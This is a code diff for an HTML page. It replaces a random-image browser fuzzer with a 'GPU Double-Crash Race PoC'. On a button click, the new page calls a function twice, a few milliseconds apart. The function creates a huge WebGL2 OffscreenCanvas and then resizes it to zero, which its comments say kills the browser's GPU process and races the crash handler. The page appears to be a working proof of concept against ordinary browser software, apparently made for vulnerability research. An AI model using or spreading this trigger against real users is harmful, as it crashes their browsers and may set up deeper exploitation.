@@ -1,42 +1,67 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <meta charset="utf-8">
+  <title>GPU Double‑Crash PoC</title>
+</head>
 <body>
-<pre id="log"></pre>
-<script>
-(async function() {
-  const log = (msg) => document.getElementById('log').textContent += msg + '\n';
-  log('Starting Skia fuzzer...');
+  <h3>GPU Double‑Crash Race PoC</h3>
+  <button id="trigger">Trigger Dual Crash</button>
+  <pre id="log">Click the button to start. Monitor logcat for results.\n</pre>
 
-  // Generate random PNG-like data (this is not valid PNG, but Chrome's decoder may still try)
-  function randomBytes(length) {
-    const arr = new Uint8Array(length);
-    for (let i = 0; i < length; i++) arr[i] = Math.floor(Math.random() * 256);
-    return arr;
-  }
+  <script>
+    (function() {
+      const log = (msg) => {
+        const el = document.getElementById('log');
+        el.textContent += msg + '\n';
+        el.scrollTop = el.scrollHeight;
+      };
 
-  async function testRandomImage() {
-    const size = Math.floor(Math.random() * 100000) + 1000; // 1 KB to 100 KB
-    const data = randomBytes(size);
-    const blob = new Blob([data], {type: 'image/png'});
-    try {
-      const bitmap = await createImageBitmap(blob);
-      const canvas = new OffscreenCanvas(bitmap.width, bitmap.height);
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(bitmap, 0, 0);
-      bitmap.close();
-      return true;
-    } catch(e) {
-      return false;
-    }
-  }
+      function crashGPU() {
+        // The known crash trigger: large OffscreenCanvas + WebGL2 + teardown
+        try {
+          const canvas = new OffscreenCanvas(16384, 16384);
+          const gl = canvas.getContext('webgl2', { powerPreference: 'high-performance' });
+          if (!gl) {
+            log('  [-] WebGL2 context not available');
+            return;
+          }
+          gl.clear(gl.COLOR_BUFFER_BIT);
+          gl.flush();
+          // This resize (to 0) tears down the command buffer and often kills the GPU process
+          canvas.width = 0;
+          canvas.height = 0;
+          log('  [*] Crash trigger sent');
+        } catch(e) {
+          log('  [!] Exception: ' + e.message);
+        }
+      }
 
-  // Run many iterations
-  for (let i = 0; i < 500; i++) {
-    if (i % 50 === 0) log(`Iteration ${i}`);
-    await testRandomImage();
-  }
-  log('Fuzzer finished – check logcat for crashes');
-})();
-</script>
+      let running = false;
+
+      document.getElementById('trigger').addEventListener('click', async () => {
+        if (running) {
+          log('[!] Already running...');
+          return;
+        }
+        running = true;
+        log('=== Starting dual crash trigger ===');
+
+        // First crash
+        crashGPU();
+
+        // Very short delay to ensure the first message is dispatched before the second
+        await new Promise(r => setTimeout(r, 5));
+
+        // Second crash – this will race with the first crash handler in the browser
+        crashGPU();
+
+        log('=== Both triggers sent – check logcat now ===');
+        running = false;
+      });
+
+      log('Ready. Press button to trigger race.');
+    })();
+  </script>
 </body>
 </html>
